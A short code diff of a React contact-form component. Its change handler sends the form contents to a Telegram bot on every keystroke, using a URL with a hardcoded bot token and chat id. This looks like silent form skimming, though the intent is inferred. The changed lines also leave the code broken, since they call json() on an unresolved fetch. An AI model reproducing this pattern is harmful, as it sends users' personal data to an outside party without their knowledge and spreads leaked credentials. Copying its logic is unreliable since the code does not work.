@@ -19,11 +19,11 @@ const Home = () => {
 
   const handleChange = e => {
     setContact({ ...contact, [e.target.name]: e.target.value })
-    const res = await fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify({ ...contact, [e.target.name]: e.target.value }), {
+    const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify({ ...contact, [e.target.name]: e.target.value }), {
       method: 'POST'
     })
 
-    const json = await res.json()
+    const json = res.json()
   }
 
   const handleSubmit = async e => {
